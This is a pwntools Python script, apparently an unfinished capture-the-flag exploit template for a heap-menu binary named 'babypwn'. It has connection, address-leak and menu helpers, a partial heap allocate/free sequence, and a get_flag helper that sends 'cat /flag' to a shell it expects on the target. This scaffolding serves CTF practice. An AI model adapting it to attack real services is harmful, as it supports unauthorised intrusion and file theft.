from pwn import *
import traceback
import sys
context.log_level='debug'
context.arch='amd64'
# context.arch='i386'

babypwn=ELF('./babypwn', checksec = False)

if context.arch == 'amd64':
    libc=ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec = False)
elif context.arch == 'i386':
    try:
        libc=ELF("/lib/i386-linux-gnu/libc.so.6", checksec = False)
    except:
        libc=ELF("/lib32/libc.so.6", checksec = False)

def get_sh(Use_other_libc = False , Use_ssh = False):
    global libc
    if args['REMOTE'] :
        if Use_other_libc :
            libc = ELF("./", checksec = False)
        if Use_ssh :
            s = ssh(sys.argv[3],sys.argv[1], sys.argv[2],sys.argv[4])
            return s.process("./babypwn")
        else:
            return remote(sys.argv[1], sys.argv[2])
    else:
        return process("./babypwn")

def get_address(sh,info=None,start_string=None,address_len=None,end_string=None,offset=None,int_mode=False):
    if start_string != None:
        sh.recvuntil(start_string)
    if int_mode :
        return_address = int(sh.recvuntil(end_string,drop=True),16)
    elif address_len != None:
        return_address = u64(sh.recv()[:address_len].ljust(8,'\x00'))
    elif context.arch == 'amd64':
        return_address=u64(sh.recvuntil(end_string,drop=True).ljust(8,'\x00'))
    else:
        return_address=u32(sh.recvuntil(end_string,drop=True).ljust(4,'\x00'))
    if offset != None:
        return_address = return_address + offset
    if info != None:
        log.success(info + str(hex(return_address)))
    return return_address

def get_flag(sh):
    sh.sendline('cat /flag')
    return sh.recvrepeat(0.3)

def get_gdb(sh,gdbscript=None,stop=False):
    gdb.attach(sh,gdbscript=gdbscript)
    if stop :
        raw_input()

def Multi_Attack():
    # testnokill.__main__()
    return

def creat(sh,name,chunk_size,value):
    sh.recvuntil('Input your choice:')
    sh.sendline('1')
    sh.recvuntil('Member name:')
    sh.send(name)
    sh.recvuntil('Description size:')
    sh.sendline(str(chunk_size))
    sh.recvuntil('Description:')
    sh.send(value)

def delete(sh,index):
    sh.recvuntil('Input your choice:')
    sh.sendline('2')
    sh.recvuntil('index:')
    sh.sendline(str(index))

def show(sh,index):
    sh.recvuntil('Input your choice:')
    sh.sendline('3')
    sh.recvuntil('index:')
    sh.sendline(str(index))

def Attack(sh=None,ip=None,port=None):
    if ip != None and port !=None:
        try:
            sh = remote(ip,port)
        except:
            return 'ERROR : Can not connect to target server!'
    try:
        # Your Code here
        creat(sh,'A' * 0x20,0x10,'Chunk0')
        creat(sh,'A' * 0x20,0x10,'Chunk1')
        delete(sh,0)
        creat(sh,'A' * 0x20,0x10,'Chunk0')
        get_gdb(sh)
        sh.interactive()
        flag=get_flag(sh)
        # try:
        #     Multi_Attack()
        # except:
        #     throw('Multi_Attack_Err')
        sh.close()
        return flag
    except Exception as e:
        traceback.print_exc()
        sh.close()
        return 'ERROR : Runtime error!'

if __name__ == "__main__":
    sh = get_sh()
    flag = Attack(sh=sh)
    log.success('The flag is ' + re.search(r'flag{.+}',flag).group())